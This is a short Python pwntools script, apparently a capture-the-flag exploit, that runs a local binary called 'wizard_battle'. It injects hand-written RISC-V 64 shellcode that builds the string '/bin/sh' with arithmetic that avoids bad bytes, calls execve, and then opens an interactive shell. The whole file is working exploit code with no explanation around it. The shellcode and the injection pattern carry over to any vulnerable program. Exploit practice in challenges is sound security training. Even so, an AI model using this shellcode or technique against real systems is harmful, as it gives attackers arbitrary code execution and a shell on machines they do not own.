#!/usr/bin/python3
from pwn import process, asm

shell = process("./wizard_battle")

shellcode = asm("""
    li    s1, 0x68732f6e69a041 # $s1 = "/bin/sh" - offset
    li    t1, -0x3dd1          # $s1 = offset to value
    add   s1, s1, t1           # $s1 = "/bin/sh"

    li    a7, 0xdd             # $a7 = execve()
    li    a7, 0xdd             # avoid bytes bug

    sd    s1, -0x8(sp)         # $sp-8 =  &"/bin/sh"
    addi  a0, sp, -0x8         # $a0 = &"/bin/sh"

    slti  a1, zero, -0x1       # $a1 = NULL
    slti  a2, zero, -0x1       # $a2 = NULL

    ecall                      # syscall
""", arch="riscv64")

shell.sendlineafter(b"ENTER", b"")
shell.sendlineafter(b": ", shellcode)

shell.recvlines(2)
shell.interactive()
